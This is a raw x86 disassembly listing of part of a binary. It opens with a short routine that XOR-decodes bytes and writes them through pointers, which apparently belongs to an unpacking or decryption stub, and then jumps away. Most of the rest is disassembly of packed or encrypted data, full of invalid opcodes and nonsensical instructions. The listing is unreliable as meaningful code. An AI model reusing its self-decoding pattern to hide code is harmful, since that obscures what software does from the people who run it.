  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fs fadd st(6),st
  40389a:	cmp    al,0x36
  40389c:	cli    
  40389d:	fstp   QWORD PTR [edi+0x62]
  4038a0:	(bad)  
  4038a1:	fstp   QWORD PTR [edi+0x62]
  4038a4:	(bad)  
  4038a5:	fmulp  st(5),st
  4038a7:	nop
  4038a8:	int    0xcc
  4038aa:	xor    bh,dh
  4038ac:	adc    DWORD PTR [esp+edx*2+0x31fa4239],edi
  4038b3:	repz inc edx
  4038b5:	adc    al,0x92
  4038b7:	mov    edi,0xd7000647
  4038bc:	ret    0x530f
  4038bf:	adc    esi,DWORD PTR [ebp-0x7c593242]
  4038c5:	add    edi,DWORD PTR [ebx]
  4038c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038c8:	mov    ah,0xe5
  4038ca:	mov    esi,0xfb8c6884
  4038cf:	xor    ah,ah
  4038d1:	xor    eax,0x4b607acb
  4038d6:	jae    0x4038c9
  4038d8:	in     al,dx
  4038d9:	adc    ebx,esi
  4038db:	dec    ebp
  4038dc:	xchg   edx,eax
  4038dd:	ins    DWORD PTR es:[edi],dx
  4038de:	add    eax,0x93c2dfe3
  4038e3:	adc    DWORD PTR [esi-0x67],eax
  4038e6:	(bad)  
  4038e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038e8:	jl     0x403968
  4038ea:	add    al,bh
  4038ec:	jae    0x40394d
  4038ee:	jge    0x403942
  4038f0:	out    dx,al
  4038f1:	retf   
  4038f2:	add    DWORD PTR [esi-0x3a4e2d80],edi
  4038f8:	add    bh,al
  4038fa:	xchg   ebp,eax
  4038fb:	fnsave [ebx-0x37]
  4038fe:	pusha  
  4038ff:	nop
  403900:	push   edi
  403901:	in     eax,0x5e
  403903:	inc    edi
  403904:	or     eax,0x5ec84bab
  403909:	mov    edi,DWORD PTR [ebp+0x1dd1605f]
  40390f:	sahf   
  403910:	push   ecx
  403911:	add    edi,0xa70884e0
  403917:	mov    edi,0x2bf6f97b
  40391c:	(bad)  
  40391d:	sub    eax,0x2abe4598
  403922:	ret    0xa09b
  403925:	push   ebp
  403926:	addr16 sar esp,0x8c
  40392a:	test   edi,ecx
  40392c:	add    al,0x2a
  40392e:	call   FWORD PTR [ecx+0x1089ff4f]
  403934:	data16 lods al,BYTE PTR ds:[esi]
  403936:	cmp    esi,DWORD PTR [eax+0x6d485f4]
  40393c:	lds    esp,FWORD PTR [edx-0x3beb0b74]
  403942:	pop    ss
  403943:	or     dl,BYTE PTR [edx+0xa]
  403946:	xlat   BYTE PTR ds:[ebx]
  403947:	jle    0x40391a
  403949:	xor    al,0xd9
  40394b:	mov    fs:0x3d26c557,al
  403951:	mov    ds:0x2360b81e,al
  403956:	je     0x4039ad
  403958:	neg    DWORD PTR [edi+0x411dd203]
  40395e:	and    bl,al
  403960:	xor    eax,0x60527ac7
  403965:	push   esp
  403966:	(bad)  [edx+0x111324f9]
  40396c:	push   eax
  40396d:	dec    esp
  40396e:	test   DWORD PTR [esi-0x409ebec8],ebp
  403974:	jae    0x403926
  403976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403977:	push   ss
  403978:	retf   
  403979:	cmp    DWORD PTR [esi],0xfb170512
  40397f:	jae    0x4039d7
  403981:	or     al,dl
  403983:	add    ch,BYTE PTR es:[esi]
  403986:	fild   DWORD PTR [ebx+eax*1-0xb1fa459]
  40398d:	fst    DWORD PTR [edx]
  40398f:	sbb    dh,ah
  403991:	mov    eax,0x933487c3
  403996:	xchg   esi,eax
  403997:	js     0x403a18
  403999:	ins    BYTE PTR es:[edi],dx
  40399a:	mov    esp,0x8386ab0a
  40399f:	sbb    DWORD PTR [ebp-0x19],ebp
  4039a2:	in     al,0x7a
  4039a4:	ja     0x4039b2
  4039a6:	test   DWORD PTR [eax-0x68973807],edx
  4039ac:	lds    ebx,FWORD PTR [ebx+0x353ea502]
  4039b2:	cli    
  4039b3:	mov    edx,0xc8445bb6
  4039b8:	js     0x4039b7
  4039ba:	add    al,0x7f
  4039bc:	sidtd  [esi+0x60]
  4039c0:	or     DWORD PTR [eax+0x6970e1ba],edx
  4039c6:	mov    BYTE PTR [edx-0x6130fa39],dl
  4039cc:	stos   DWORD PTR es:[edi],eax
  4039cd:	pop    ebx
  4039ce:	fstp   QWORD PTR [esi-0x22208e63]
  4039d4:	test   ecx,esi
  4039d6:	mov    al,ds:0xc3293c1b
  4039db:	adc    dh,BYTE PTR [ebp+0x68db0f0a]
  4039e1:	call   0x766a:0x4fcfac1c
  4039e8:	mov    dh,0x32
  4039ea:	inc    esp
  4039eb:	push   ss
  4039ec:	fs jb  0x40398e
  4039ef:	mov    ch,BYTE PTR [eax]
  4039f1:	lods   eax,DWORD PTR ds:[esi]
  4039f2:	xor    BYTE PTR [ebx],bh
  4039f4:	xlat   BYTE PTR ds:[ebx]
  4039f5:	mov    dh,dh
  4039f7:	cwde   
  4039f8:	pop    edi
  4039f9:	out    dx,eax
  4039fa:	mov    esp,0xc6274d67
  4039ff:	dec    esp
  403a00:	mov    bp,0xed5c
  403a04:	call   0x6fa98a7b
  403a09:	into   
  403a0a:	push   cs
  403a0b:	jp     0x4039ff
  403a0d:	and    bl,ah
  403a0f:	in     eax,dx
  403a10:	(bad)  
  403a11:	fucom  st(6)
  403a13:	xor    BYTE PTR [edi-0xe774b4d],al
  403a19:	mov    bh,0x12
  403a1b:	dec    edx
  403a1c:	shr    DWORD PTR ds:0xa2de7630,1
  403a22:	fs push eax
  403a24:	out    0xb3,eax
  403a26:	mov    al,0x28
  403a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a29:	sub    edi,edx
  403a2b:	push   esp
  403a2c:	or     eax,0xc5c9ac04
  403a31:	mov    bh,0xa8
  403a33:	xchg   esi,eax
  403a34:	lea    edx,[ecx-0x147bde67]
  403a3a:	or     eax,0xc59e490a
  403a3f:	aad    0x78
  403a41:	inc    esp
  403a42:	push   edx
  403a43:	add    bh,BYTE PTR [ecx+0x6f137210]
  403a49:	mov    ch,0x78
  403a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a4c:	sbb    cl,BYTE PTR [edi-0x632b3c4e]
  403a52:	mov    BYTE PTR [ebx+0x11d48814],dh
  403a58:	pusha  
  403a59:	mov    cl,0xb2
  403a5b:	jno    0x4039df
  403a5d:	mov    BYTE PTR [esi-0x2b],al
  403a60:	out    dx,eax
  403a61:	sub    BYTE PTR [edi+0x5cb53ef4],0xec
  403a68:	mov    DWORD PTR [ebx+eiz*2],ecx
  403a6b:	add    BYTE PTR [edi],bh
  403a6d:	mov    eax,0xe68f0617
  403a72:	ins    BYTE PTR es:[edi],dx
  403a73:	xlat   BYTE PTR ds:[ebx]
  403a74:	mov    ch,0x8e
  403a76:	xor    bl,BYTE PTR [edi]
  403a78:	ficomp DWORD PTR es:[edi]
  403a7b:	(bad)  
  403a7c:	in     eax,dx
  403a7d:	loopne 0x403a47
  403a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a80:	ja     0x403a41
  403a82:	inc    esi
  403a83:	adc    DWORD PTR [ebx-0x73b82b83],eax
  403a89:	sub    BYTE PTR [eax+0x2befd0fc],ah
  403a8f:	mov    ds:0x1c66112e,al
  403a94:	inc    ebp
  403a95:	stos   BYTE PTR es:[edi],al
  403a96:	xchg   ebp,eax
  403a97:	pop    ebx
  403a98:	and    DWORD PTR [ecx],esi
  403a9a:	lds    ecx,FWORD PTR [edi+0xb]
  403a9d:	repz hlt 
  403a9f:	xchg   DWORD PTR [edi+0x52],ecx
  403aa2:	into   
  403aa3:	popf   
  403aa4:	xchg   ecx,eax
  403aa5:	mov    cl,0x6
  403aa7:	adc    al,ah
  403aa9:	(bad)  
  403aaa:	lds    ebx,FWORD PTR [edx]
  403aac:	push   ebp
  403aad:	leave  
  403aae:	push   ss
  403aaf:	mov    bl,0xdd
  403ab1:	cwde   
  403ab2:	cmp    dh,BYTE PTR [edi-0x5f]
  403ab5:	out    dx,eax
  403ab6:	sar    DWORD PTR [ebx+0x6c],cl
  403ab9:	dec    ecx
  403aba:	jns    0x403b29
  403abc:	outs   dx,DWORD PTR ds:[esi]
  403abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403abe:	rol    BYTE PTR ds:0x61d213ce,0xe9
  403ac5:	xor    eax,0xde69db6d
  403aca:	ret    
  403acb:	cld    
  403acc:	sub    BYTE PTR [ecx+edi*1-0x19],ch
  403ad0:	rcl    BYTE PTR ds:0x1fdf88bd,0xd0
  403ad7:	repnz adc BYTE PTR [esi-0x2e],al
  403adb:	jbe    0x403a8d
  403add:	xor    dl,0xf6
  403ae0:	jle    0x403aee
  403ae2:	pop    ebx
  403ae3:	xchg   edx,eax
  403ae4:	repnz fcomip st,st(2)
  403ae7:	mov    dl,0xec
  403ae9:	ins    DWORD PTR es:[edi],dx
  403aea:	mov    edx,0x673b5a33
  403aef:	add    eax,0xb711fe3c
  403af4:	lea    ebx,ds:0x53dd4a7b
  403afa:	ja     0x403aba
  403afc:	call   0x2a4a:0x4cef1661
  403b03:	push   ss
  403b04:	adc    al,0x32
  403b06:	xor    al,0xb1
  403b08:	sbb    BYTE PTR [edx-0x72e805c3],bl
  403b0e:	jns    0x403b22
  403b10:	enter  0xf5d5,0xc1
  403b14:	mov    eax,ds:0x30b8f5e1
  403b19:	push   cs
  403b1a:	inc    ecx
  403b1b:	add    al,0xb3
  403b1d:	scas   eax,DWORD PTR es:[edi]
  403b1e:	inc    esi
  403b1f:	pop    ecx
  403b20:	imul   eax,DWORD PTR [ebp+0x1b],0x7076ddf
  403b27:	sub    eax,0xbd898e78
  403b2c:	test   eax,0x16700a7a
  403b31:	mov    esp,0x4bb680c3
  403b36:	and    BYTE PTR [eax],bl
  403b38:	pusha  
  403b39:	sar    dl,1
  403b3b:	aas    
  403b3c:	ror    ebx,cl
  403b3e:	xchg   DWORD PTR [esi+0x7117d22b],ebp
  403b44:	jecxz  0x403b26
  403b46:	je     0x403b5d
  403b48:	mov    cl,0x71
  403b4a:	std    
  403b4b:	rcr    DWORD PTR [esi],cl
  403b4d:	imul   edi,DWORD PTR [ecx],0x13630483
  403b53:	pop    ds
  403b54:	mov    bl,0x96
  403b56:	mov    ebp,0x5c20d051
  403b5b:	and    DWORD PTR [ebp+edx*4+0x53a0ecc7],edi
  403b62:	(bad)  
  403b63:	add    ebp,edi
  403b65:	fimul  DWORD PTR [edi*2+0x777917c1]
  403b6c:	push   cs
  403b6d:	mov    ds:0x48ed151d,eax
  403b72:	pop    ds
  403b73:	test   bh,dl
  403b75:	mov    bh,0x6e
  403b77:	loope  0x403afe
  403b79:	mov    edx,0xfe65cfba
  403b7e:	cmp    bl,BYTE PTR [esi-0x31d00fee]
  403b84:	(bad)  
  403b85:	out    dx,eax
  403b86:	adc    edx,edi
  403b88:	dec    eax
  403b89:	mov    BYTE PTR [esi-0x5a],dl
  403b8c:	leave  
  403b8d:	pop    ebp
  403b8e:	loope  0x403bcd
  403b90:	call   0xf653dfdd
  403b95:	mov    ch,0x83
  403b97:	hlt    
  403b98:	(bad)  
  403b99:	mov    dl,0xff
  403b9b:	add    BYTE PTR [ebx],cl
  403b9d:	and    eax,0x81e8fbda
  403ba2:	xchg   ebp,eax
  403ba3:	sub    ebp,DWORD PTR [ebx+0x50]
  403ba6:	xor    BYTE PTR [eax-0x608d11ca],bl
  403bac:	out    dx,eax
  403bad:	mov    eax,edx
  403baf:	lods   eax,DWORD PTR ds:[esi]
  403bb0:	pop    ebx
  403bb1:	das    
  403bb2:	push   0x3e
  403bb4:	pop    ebp
  403bb5:	xchg   ecx,eax
  403bb6:	push   edi
  403bb7:	push   esp
  403bb8:	repnz dec eax
  403bba:	xchg   ebx,eax
  403bbb:	(bad)  
  403bbd:	test   eax,0x6d8267f2
  403bc2:	std    
  403bc3:	or     eax,0x1b6252a4
  403bc8:	dec    esp
  403bc9:	jle    0x403bac
  403bcb:	xchg   esi,eax
  403bcc:	out    dx,al
  403bcd:	aam    0x36
  403bcf:	outs   dx,DWORD PTR ds:[esi]
  403bd0:	mov    dl,0x49
  403bd2:	jg     0x403c1e
  403bd4:	xor    ecx,DWORD PTR [ebx-0x2e35413c]
  403bda:	add    ebp,eax
  403bdc:	nop
  403bdd:	out    dx,eax
  403bde:	mov    al,ds:0x7dc5898b
  403be3:	xchg   esi,eax
  403be4:	out    0x29,eax
  403be6:	leave  
  403be7:	test   DWORD PTR [edx-0x5b],ebx
  403bea:	lea    ebx,[ebx+0x238fe972]
  403bf0:	xor    BYTE PTR [esp+eiz*8+0x8c9b3fa],bl
  403bf7:	add    edx,esi
  403bf9:	or     al,0x58
  403bfb:	cmp    DWORD PTR [esi],esi
  403bfd:	jmp    DWORD PTR [ebx-0x1d]
  403c00:	ja     0x403c70
  403c02:	mov    ah,0x5a
  403c04:	jmp    0x403c53
  403c06:	mov    esp,ecx
  403c08:	enter  0xd393,0xc2
  403c0c:	adc    eax,0x8e6b9661
  403c11:	je     0x403bdb
  403c13:	mov    ecx,0xb7fc2b60
  403c18:	in     al,0x5
  403c1a:	pop    ds
  403c1b:	jmp    0xf6bba071
  403c20:	sbb    BYTE PTR [edx],bl
  403c22:	popa   
  403c23:	enter  0xdff5,0x6d
  403c27:	adc    DWORD PTR [edi+0x66],ebp
  403c2a:	xchg   ebx,eax
  403c2b:	xchg   esp,eax
  403c2c:	cmp    cl,al
  403c2e:	inc    eax
  403c2f:	pop    edi
  403c30:	ret    
  403c31:	dec    esp
  403c32:	pushaw 
  403c34:	mov    dl,0x15
  403c36:	xor    dl,0x52
  403c39:	push   esp
  403c3a:	daa    
  403c3b:	pop    es
  403c3c:	xor    DWORD PTR [edx-0x2f65e4fc],ebp
  403c42:	push   edi
  403c43:	shl    edi,0xf6
  403c46:	xchg   edx,eax
  403c47:	cli    
  403c48:	imul   edx,DWORD PTR [eax+0x5f],0xffffff81
  403c4c:	xchg   ebx,eax
  403c4d:	(bad)  
  403c4f:	(bad)  
  403c51:	mov    ecx,0x5f883e4c
  403c56:	pushf  
  403c57:	hlt    
  403c58:	mov    edx,0xae80080c
  403c5d:	cmp    eax,0xf7d0687
  403c62:	xchg   ebp,eax
  403c63:	add    al,0x29
  403c65:	pop    ss
  403c66:	lods   al,BYTE PTR ds:[esi]
  403c67:	aaa    
  403c68:	and    al,0x64
  403c6a:	inc    esp
  403c6b:	je     0x403c1e
  403c6d:	enter  0xdb24,0x3b
  403c71:	push   ss
  403c72:	lock ss je 0x403c20
  403c76:	mov    ds:0xab7c1574,eax
  403c7b:	addr16 push ebp
  403c7d:	mov    esp,DWORD PTR [esi+ebp*2]
  403c80:	push   ebp
  403c81:	pushf  
  403c82:	mov    ds:0xfa197eca,eax
  403c87:	(bad)  
  403c88:	ds push esp
  403c8a:	fild   QWORD PTR [ecx+eiz*1-0x21]
  403c8e:	lahf   
  403c8f:	or     ebp,edx
  403c91:	dec    ebx
  403c92:	jo     0x403c9a
  403c94:	aaa    
  403c95:	(bad)  
  403c96:	mov    esi,0xa8443ee9
  403c9b:	pop    esi
  403c9c:	or     DWORD PTR [esi+0x0],edx
  403c9f:	(bad)  
  403ca0:	pop    ds
  403ca1:	js     0x403c8d
  403ca3:	sub    esi,DWORD PTR [ebx+0x59318a45]
  403ca9:	outs   dx,DWORD PTR ds:[esi]
  403caa:	mov    ebx,DWORD PTR [ebp-0x3e]
  403cad:	idiv   DWORD PTR [ebx+0x29277461]
  403cb3:	mov    ecx,?
  403cb5:	add    BYTE PTR [ebx+eax*4],ch
  403cb8:	pop    ds
  403cb9:	sub    cl,BYTE PTR [edi-0x6c]
  403cbc:	fld    QWORD PTR [esi]
  403cbe:	jg     0x403cd8
  403cc0:	add    bl,0x74
  403cc3:	es inc edx
  403cc5:	dec    esp
  403cc6:	lds    eax,FWORD PTR [ecx+edx*4]
  403cc9:	cs xchg edx,eax
  403ccb:	pop    ecx
  403ccc:	shl    DWORD PTR [edx-0x1],1
  403ccf:	xor    dl,dh
  403cd1:	in     al,dx
  403cd2:	cs test al,0x85
  403cd5:	or     DWORD PTR [ebx],ebx
  403cd7:	pop    ecx
  403cd8:	scas   al,BYTE PTR es:[edi]
  403cd9:	xlat   BYTE PTR ds:[ebx]
  403cda:	lahf   
  403cdb:	jne    0x403cc6
  403cdd:	pop    ecx
  403cde:	fwait
  403cdf:	pop    esp
  403ce0:	fdiv   st(2),st
  403ce2:	adc    eax,0x93e70d02
  403ce7:	out    0x6f,al
  403ce9:	add    eax,0xe3b2f4ed
  403cee:	loope  0x403d58
  403cf0:	hlt    
  403cf1:	mov    al,0x61
  403cf3:	nop
  403cf4:	jge    0x403d3e
  403cf6:	je     0x403cf2
  403cf8:	cmp    eax,DWORD PTR [eax]
  403cfa:	dec    esi
  403cfb:	inc    eax
  403cfc:	(bad)  
  403cfd:	std    
  403cfe:	push   ds
  403cff:	mov    DWORD PTR [esi-0x37],eax
  403d02:	dec    ecx
  403d03:	rcr    DWORD PTR [edi],1
  403d05:	xor    al,0x4b
  403d07:	fild   DWORD PTR [edx+ebx*2+0x22]
  403d0b:	lea    edx,[ebp-0x50d83593]
  403d11:	sahf   
  403d12:	add    esi,DWORD PTR [edx+0x4b]
  403d15:	adc    ch,ch
  403d17:	cwde   
  403d18:	sub    eax,0xb809faaf
  403d1d:	retf   0x80ff
  403d20:	lea    ecx,[edx+0x403d9ed9]
  403d26:	adc    eax,ecx
  403d28:	push   edi
  403d29:	mov    al,ds:0xdebbeaa8
  403d2e:	jle    0x403cc0
  403d30:	leave  
  403d31:	in     eax,dx
  403d32:	jb     0x403ce7
  403d34:	and    DWORD PTR [ebp-0x794dd300],eax
  403d3a:	test   al,0x7b
  403d3c:	pop    esp
  403d3d:	mov    edi,0xbb6592a2
  403d42:	mov    BYTE PTR [edi-0x3f],dl
  403d45:	xchg   ebp,eax
  403d46:	shl    DWORD PTR [edx-0x20db59d0],1
  403d4c:	jns    0x403d06
  403d4e:	nop
  403d4f:	int    0x2a
  403d51:	aad    0xc5
  403d53:	shl    BYTE PTR [eax+0x44d9595a],cl
  403d59:	je     0x403d08
  403d5b:	sub    al,0x3e
  403d5d:	mov    ds:0x34106716,al
  403d62:	leave  
  403d63:	cdq    
  403d64:	xchg   DWORD PTR [eax-0x72],eax
  403d67:	adc    eax,DWORD PTR [edx-0x2487d45f]
  403d6d:	arpl   WORD PTR [edi],ax
  403d6f:	out    dx,al
  403d70:	enter  0x456f,0x31
  403d74:	jno    0x403d6b
  403d76:	dec    edx
  403d77:	jnp    0x403dbf
  403d79:	(bad)  
  403d7a:	xor    eax,0x9e9ae38
  403d7f:	mov    esi,0x56ea897a
  403d84:	push   0x3a836025
  403d89:	push   ecx
  403d8a:	add    al,0xa1
  403d8c:	aad    0x81
  403d8e:	hlt    
  403d8f:	popf   
  403d90:	sub    esp,DWORD PTR [ecx-0x24]
  403d93:	out    dx,eax
  403d94:	repz mov WORD PTR [ebx+eiz*4],ss
  403d98:	ror    esp,1
  403d9a:	ins    BYTE PTR es:[edi],dx
  403d9b:	dec    ebp
  403d9c:	add    DWORD PTR [ecx],eax
  403d9e:	lahf   
  403d9f:	mov    cl,0x7b
  403da1:	cs or  esi,ebp
  403da4:	in     eax,dx
  403da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403da6:	sbb    eax,0x490aaf0a
  403dab:	sbb    ecx,DWORD PTR ds:0x63139b7d
  403db1:	cmp    ebx,DWORD PTR [ecx+ebp*4+0x35]
  403db5:	fidivr WORD PTR [edi-0x30]
  403db8:	idiv   DWORD PTR [ebp-0x4a]
  403dbb:	add    ebp,DWORD PTR [edi]
  403dbd:	pop    edi
  403dbe:	(bad)  
  403dbf:	stos   DWORD PTR es:[edi],eax
  403dc0:	loope  0x403ddc
  403dc2:	xor    edx,DWORD PTR [esp+ebp*1]
  403dc5:	xor    al,cl
  403dc7:	dec    esp
  403dc8:	mul    esi
  403dca:	mov    edx,0x78a42d68
  403dcf:	cmp    eax,0x8012ff31
  403dd4:	es (bad) 
  403dd6:	pop    esi
  403dd7:	test   eax,0x9d2d4d9b
  403ddc:	sbb    BYTE PTR [ecx+0x6e91c305],ch
  403de2:	pop    esi
  403de3:	mov    ds:0xc35c7cd8,eax
  403de8:	push   ecx
  403de9:	ror    DWORD PTR [ebx],1
  403deb:	inc    esp
  403dec:	push   edx
  403ded:	popa   
  403dee:	out    0x8d,eax
  403df0:	test   DWORD PTR [ebp+0x6cc09f8d],eax
  403df6:	lea    eax,[ebx]
  403df8:	ss loope 0x403d95
  403dfb:	retf   0x32d3
  403dfe:	sbb    eax,0xcdfbbb66
  403e03:	dec    edi
  403e04:	ins    DWORD PTR es:[edi],dx
  403e05:	mov    bh,0x28
  403e07:	les    ecx,FWORD PTR [eax+0x74]
  403e0a:	sti    
  403e0b:	mov    ebx,ds
  403e0d:	pusha  
  403e0e:	aaa    
  403e0f:	das    
  403e10:	pop    ds
  403e11:	jns    0x403e86
  403e13:	adc    DWORD PTR ds:0xf304d416,esi
  403e19:	xchg   esi,eax
  403e1a:	xor    DWORD PTR [ebx-0x65],esp
  403e1d:	pop    ecx
  403e1e:	(bad)
  403e22:	inc    esi
  403e23:	inc    ebp
  403e24:	add    BYTE PTR [edx+0x7ee7e229],0x4e
  403e2b:	sbb    DWORD PTR [edi+edi*4+0x2dc7c914],ebx
  403e32:	sar    BYTE PTR [edx+0x7eafb340],cl
  403e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e39:	dec    edi
  403e3a:	pop    eax
  403e3b:	into   
  403e3c:	mov    eax,ds:0x7fc4dcf7
  403e41:	out    0xe,al
  403e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e44:	fwait
  403e45:	lds    eax,FWORD PTR [edi+eax*4]
  403e48:	add    BYTE PTR [edi-0x4544c6b4],dh
  403e4e:	mov    bh,0xd6
  403e50:	jle    0x403e4a
  403e52:	xchg   edx,eax
  403e53:	fisub  DWORD PTR [esi+0xac58b45]
  403e59:	sub    ah,BYTE PTR [esi]
  403e5b:	je     0x403e83
  403e5d:	inc    ebp
  403e5e:	or     eax,0x67ecfc66
  403e63:	iret   
  403e64:	int    0x80
  403e66:	fsincos 
  403e68:	es cdq 
  403e6a:	and    DWORD PTR [edx],esp
  403e6c:	cwde   
  403e6d:	mov    cl,0x8d
  403e6f:	pop    es
  403e70:	or     edi,esp
  403e72:	lea    esp,[ebx+0x3340237b]
  403e78:	iret   
  403e79:	inc    eax
  403e7a:	cmp    edx,DWORD PTR [eax+0x74f88dc6]
  403e80:	mov    cs,esi
  403e82:	or     al,0xec
  403e84:	out    dx,eax
  403e85:	out    0x32,eax
  403e87:	retf   0x2ace
  403e8a:	mov    bh,0xbe
  403e8c:	fwait
  403e8d:	adc    al,BYTE PTR [edi]
  403e8f:	test   DWORD PTR [eax],0x1b5df6ed
  403e95:	and    eax,0xfc92babe
  403e9a:	(bad)  
  403e9b:	ror    DWORD PTR [esp+edi*2],1
  403e9e:	xchg   BYTE PTR [edx-0x66],ch
  403ea1:	ret    0xb64d
  403ea4:	mov    cs,WORD PTR [edx]
  403ea6:	adc    eax,0x4e9a38af
  403eab:	jo     0x403f2b
  403ead:	and    bh,BYTE PTR [eax]
  403eaf:	pop    eax
  403eb0:	pushf  
  403eb1:	pop    edi
  403eb2:	push   ebp
  403eb3:	mov    ah,BYTE PTR [ecx+0xab69fc2]
  403eb9:	add    eax,0xc3b8beac
  403ebe:	add    DWORD PTR [edi],eax
  403ec0:	sub    BYTE PTR cs:[esi],0xce
  403ec4:	mov    dh,0xf9
  403ec6:	xchg   ecx,eax
  403ec7:	mov    al,ch
  403ec9:	and    eax,0xb7b62768
  403ece:	sbb    eax,0xde234775
  403ed3:	xor    eax,0x663827df
  403ed8:	sbb    eax,0x8ef4d4a6
  403edd:	sti    
  403ede:	jl     0x403e87
  403ee0:	(bad)  
  403ee1:	out    dx,eax
  403ee2:	adc    al,0x64
  403ee4:	mov    dl,0xf4
  403ee6:	jl     0x403e71
  403ee8:	inc    ecx
  403ee9:	inc    esi
  403eea:	(bad)  
  403eeb:	std    
  403eec:	cmp    ebp,DWORD PTR [ebx-0x2618661a]
  403ef2:	(bad)  
  403ef3:	fcmove st,st(6)
  403ef5:	jne    0x403f28
  403ef7:	nop
  403ef8:	or     BYTE PTR [edx],bh
  403efa:	out    dx,al
  403efb:	leave  
  403efc:	sub    ah,BYTE PTR [edx+0x79]
  403eff:	inc    edx
  403f00:	mov    dl,0xb9
  403f02:	fmul   QWORD PTR [edi+0x5abdac9b]
  403f08:	lds    esp,FWORD PTR [ebp-0x6179a7d4]
  403f0e:	jmp    0x403f17
  403f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f11:	aad    0xd8
  403f13:	cs pushf 
  403f15:	mov    ch,0xba
  403f17:	leave  
  403f18:	nop
  403f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f1a:	mov    cl,0x48
  403f1c:	ret    
  403f1d:	cmc    
  403f1e:	popa   
  403f1f:	jecxz  0x403f9f
  403f21:	mov    ds:0xca52d7db,eax
  403f26:	int3   
  403f27:	imul   ebp,DWORD PTR [esi],0x1c
  403f2a:	xchg   esi,eax
  403f2b:	adc    DWORD PTR [eax+0x23],edi
  403f2e:	mov    ds:0xb73c6557,eax
  403f33:	and    BYTE PTR [esi+ebx*4-0x47],ah
  403f37:	mov    esi,?
  403f39:	inc    esi
  403f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f3b:	push   eax
  403f3c:	xor    DWORD PTR [ecx+0x59],ebp
  403f3f:	iret   
  403f40:	pusha  
  403f41:	lea    esp,[ecx]
  403f43:	popf   
  403f44:	(bad)  
  403f45:	mov    BYTE PTR [esi],bl
  403f47:	sub    al,0xc9
  403f49:	call   0x138c9b40
  403f4e:	ins    DWORD PTR es:[edi],dx
  403f4f:	xchg   DWORD PTR [ebx],ebp
  403f51:	stc    
  403f52:	add    ebp,eax
  403f54:	inc    ecx
  403f55:	jae    0x403f03
  403f57:	leave  
  403f58:	cmp    al,0x74
  403f5a:	pop    ecx
  403f5b:	mov    cl,0xaf
  403f5d:	daa    
  403f5e:	jbe    0x403f09
  403f60:	lods   al,BYTE PTR ds:[esi]
  403f61:	dec    eax
  403f62:	ret    
  403f63:	lock or ebp,DWORD PTR [ebp-0x24]
  403f67:	sti    
  403f68:	in     eax,0x24
  403f6a:	std    
  403f6b:	in     eax,dx
  403f6c:	jecxz  0x403fe5
  403f6e:	je     0x403f1e
  403f70:	xor    DWORD PTR [esi+eiz*1],ebp
  403f73:	cmp    BYTE PTR [eax-0x5db6ac00],0x80
  403f7a:	fyl2x  
  403f7c:	lock mov dl,0x34
  403f7f:	test   eax,0x536e6185
  403f84:	data16 and bh,BYTE PTR [ebp-0x254f7fbd]
  403f8b:	mov    dl,0xf7
  403f8d:	loope  0x403f8c
  403f8f:	mov    cl,dl
  403f91:	add    DWORD PTR [edx+0x39],0xd8a04473
  403f98:	jbe    0x403f58
  403f9a:	fistp  DWORD PTR [edi+0x6bfe18ce]
  403fa0:	jno    0x403fbf
  403fa2:	int3   
  403fa3:	mov    esp,0x2d115fc9
  403fa8:	popf   
  403fa9:	jmp    0x403f47
  403fab:	dec    ecx
  403fac:	jne    0x40401f
  403fae:	mov    bh,0xa6
  403fb0:	out    0xd,al
  403fb2:	xor    esp,eax
  403fb4:	out    dx,eax
  403fb5:	or     bl,BYTE PTR [ebx]
  403fb7:	pop    ebx
  403fb8:	adc    esi,DWORD PTR [edi]
  403fba:	and    DWORD PTR [esi],ebx
  403fbc:	(bad)  
  403fbd:	shl    DWORD PTR [edi+0x3],cl
  403fc0:	sahf   
  403fc1:	mov    esi,0x19945be
  403fc6:	popf   
  403fc7:	xlat   BYTE PTR ds:[ebx]
  403fc8:	ret    
  403fc9:	repz clc 
  403fcb:	lock mov esi,esp
  403fce:	jbe    0x404003
  403fd0:	int3   
  403fd1:	sbb    BYTE PTR [ebp-0x43],ah
  403fd4:	or     al,0x80
  403fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fd7:	sahf   
  403fd8:	jmp    0xb7ed8314
  403fdd:	arpl   WORD PTR [ecx+0x74062128],bx
  403fe3:	add    DWORD PTR [edx+ecx*4+0x35],0xffffff8f
  403fe8:	jb     0x403fa6
  403fea:	jns    0x403f9f
  403fec:	fcmovu st,st(7)
  403fee:	push   cs
  403fef:	and    DWORD PTR [eax+edx*2-0x51],edi
  403ff3:	push   edi
  403ff4:	in     al,0x60
  403ff6:	fnsave [esi-0x7cb05f92]
